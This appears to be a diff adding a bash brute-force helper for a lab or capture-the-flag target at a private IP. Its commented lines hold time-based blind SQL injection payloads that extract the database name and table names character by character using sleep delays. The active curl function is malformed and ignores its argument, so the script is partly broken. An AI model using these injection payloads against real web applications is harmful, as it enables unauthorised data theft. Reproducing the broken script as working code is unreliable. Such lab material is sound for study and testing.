@@ -1,0 +1,26 @@
+curlfunc () { 
+    curl --silent POST -d "curl.txt" http://192.168.56.103/results.php
+}
+
+func="$2"
+
+case $func in
+(*[[:alpha:]]*)
+for i in {a..z}
+do
+echo "[*] trying '$i'..."
+curlfunc "$i"
+done
+;;
+(*[![:alpha:]]*)
+for i in {0..9}
+do
+echo "[*] trying '$i'..."
+curlfunc "$i"
+done
+;;
+esac
+
+#curl --silent -X POST -F "search=mary' and if((select substring(database(),$1,1)) = '$i', sleep(3), false) and '1'='1" http://192.168.56.103/results.php
+#curl --silent POST -F "search=mary' and if((select substring(table_name,$1,1) from information_schema.tables where table_schema = 'staff' LIMIT 1) = '$i',sleep(15),false) and '1'='1" http://192.168.56.103/results.php >> output
+#echo "[*] trying $i..."
